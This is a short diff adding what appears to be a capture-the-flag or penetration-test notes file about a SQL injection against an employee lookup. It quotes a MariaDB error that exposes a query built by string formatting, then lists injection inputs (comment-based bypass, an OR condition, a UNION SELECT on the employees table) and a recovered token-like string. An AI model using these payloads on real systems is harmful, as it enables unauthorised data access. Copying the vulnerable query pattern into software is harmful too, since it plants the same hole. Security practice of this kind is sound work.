@@ -1,0 +1,13 @@
+
+EXCEPTION AT (LINE 96 "user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1".format(uid))"): (1064, u"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''or 1-- -'' LIMIT 1' at line 1")
+
+or 1-- -'
+
+' OR enabled = 1 #
+
+oRfjg5uGHmbduj2m
+
+
+' union  SELECT first_name,last_name,enabled FROM employees WHERE enabled = 1 # 
+
+Authorized User Account Has Been Disabled!
